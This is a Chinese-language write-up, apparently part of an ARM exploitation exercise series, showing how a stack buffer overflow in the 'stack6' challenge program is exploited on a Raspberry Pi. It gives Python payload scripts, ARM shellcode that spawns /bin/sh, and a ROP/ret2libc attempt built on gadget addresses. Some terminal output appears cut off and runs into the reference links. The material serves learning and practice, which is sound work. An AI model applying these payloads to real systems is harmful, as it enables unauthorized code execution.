利用一个exp，功能是：先填充到返回地址前，再利用返回地址后的任意一个栈地址（nop指令区间就行），将返回地址覆盖，在用点nop来防止环境变量的改变影响栈偏移，最后加上shellcode。
    import struct
    padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xbefff0d0)
    payload1 = "x01x30x8fxe2x13xffx2fxe1x01x21x48x1cx92x1axc8x27x51x37x01xdfx04x1cx14xa1x4ax70x8ax80xc0x46x8ax71xcax71x10x22x01x37x01xdfx60x1cx01x38x02x21x02x37x01xdfx60x1cx01x38x49x40x52x40x01x37x01xdfx04x1cx60x1cx01x38x49x1ax3fx27x01xdfxc0x46x60x1cx01x38x01x21x01xdfx60x1cx01x38x02x21x01xdfx04xa0x49x40x52x40xc2x71x0bx27x01xdfx02xffx11x5cx01x01x01x01x2fx62x69x6ex2fx73x68x58"
    print padding + return_addr + "x90"*100 + payload1
执行结果
`受控端`
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack6 :    add    r0, r4, #6
       0xb6ea5dfc :    pop    {r4, pc}
在getpath函数的pop处，我们将seed48函数内的`0xb6ea5dfc`覆盖到返回地址处，他会执行到`pop {r4,
pc}`，然后我们`/bin/sh`地址减6的值放在下一个栈地址，准备pop到r4内，然后再将`0xb6ea5df8`放入压入栈中pop进pc来实现r0的赋值
    第一步：覆盖返回地址（python脚本）
    import struct
    padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xb6ea5dfc)
    print padding + return_addr
    第二步：找到/bin/sh的地址
    gef> find 0xb6e74000,+9999999,"/bin/sh"
    0xb6f91b20
    第三步：0xb6f91b20-6=0xb6f91b1a放入栈中准备赋值给r4，再把0xb6ea5df8 赋给pc，进行r0的赋值
    import struct
    padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
    return_addr = struct.pack("I", 0xb6ea5dfc)
    print padding + return_addr + "x1ax1bxf9xb6" + "xf8x5dxeaxb6"
    第四步：寻找system地址
    使用命令objdump -d stack6查看是否存在system@plt，发现本程序并没有system函数的入口点
根据上面的流程，一切都准备好了，结果没有找到system函数入口，所以RET2ZP（ROP+RET2LIBC）使用失败，主要熟悉了这种技术的使用流程，退而求其次我们使用可执行文件内有的函数exit，来直接退出。
`objdump -d stack6`找到plt表内的地址，然后直接覆盖到准备pop到pc寄存器的栈地址
    00010380 :
       10380:       e28fc600        add     ip, pc, #0, 12
       10384:       e28cca10        add     ip, ip, #16, 20 ; 0x10000
       10388:       e5bcf3b8        ldr     pc, [ip, #952]! ; 0x3b8
`poc.py`
    import struct
    padding = "11111111111111111111111111111111111111111111111111111111111111111111111111111111"
    print padding + "x80x03x01x00"
执行结果，直接退出：
    pi@raspberrypi:~/Desktop/ARM-challenges $ ./stack6  [exploitation-on-arm](https://www.exploit-> db.com/docs/english/14548-exploitation-on-arm---presentation.pdf)  
>
> [ret2ZP技术的一些实际的例子](https://doc.lagout.org/security/XXXX_ARM_exploitation.pdf)  
> [github上的开源工具ROPgadget Tool](https://github.com/JonathanSalwan/ROPgadget)  
> [Fix the run-time error by
> CS_ARCH_SPARC](https://github.com/wonhongkwon/ROPgadget/commit/8e520b8304bcad48a701d1a6860a822140536025)  
> [基本ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-> rop/)